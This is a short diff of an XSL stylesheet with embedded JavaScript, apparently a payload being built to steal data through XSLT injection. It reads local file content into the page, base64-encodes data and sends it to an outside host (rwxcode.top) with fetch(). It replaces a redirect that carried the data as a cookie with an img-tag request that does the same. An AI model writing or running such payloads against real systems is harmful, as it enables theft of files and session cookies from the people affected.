@@ -32,9 +32,12 @@ local file content:&lt;textarea style="width:100%;height:6rem">${ p.innerHTML }&
         
       fetch('http://rwxcode.top/log?info=' + btoa(aaa));
 
-      document.location = 'http://rwxcode.top/log?cookie=' + btoa(aaa);
-      
+      //document.location = 'http://rwxcode.top/log?cookie=' + btoa(aaa);
+
+        xxx = 'http://rwxcode.top/log?cookie=' + btoa(aaa);
       </script>
+
+      <img/src=&xxx>
     </body>
   </xsl:template>
 </xsl:stylesheet>
